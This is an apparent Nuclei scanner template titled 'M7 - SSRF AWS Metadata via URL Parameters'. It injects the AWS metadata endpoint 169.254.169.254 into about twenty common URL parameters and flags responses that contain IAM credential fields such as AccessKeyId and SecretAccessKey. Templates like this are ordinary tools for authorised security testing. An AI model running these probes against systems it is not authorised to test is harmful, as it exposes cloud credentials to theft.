id: m7-ssrf-aws-metadata
info:
  name: M7 - SSRF AWS Metadata via URL Parameters
  author: Sharlix
  severity: critical
  description: Tests common URL parameters for SSRF leading to AWS metadata
  tags: ssrf,aws,cloud,m7hunter
  reference:
    - https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/

requests:
  - method: GET
    path:
      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      - "{{BaseURL}}?redirect=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?src=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?uri=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?fetch=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?image=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?proxy=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?file=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?path=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?dest=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?return=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?next=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?callback=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?data=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?input=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?link=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?load=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?request=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?html=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}?target=http://169.254.169.254/latest/meta-data/"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
          - "local-ipv4"
          - "security-credentials"
          - "iam"
          - "AccessKeyId"
          - "SecretAccessKey"
        part: body
        condition: or
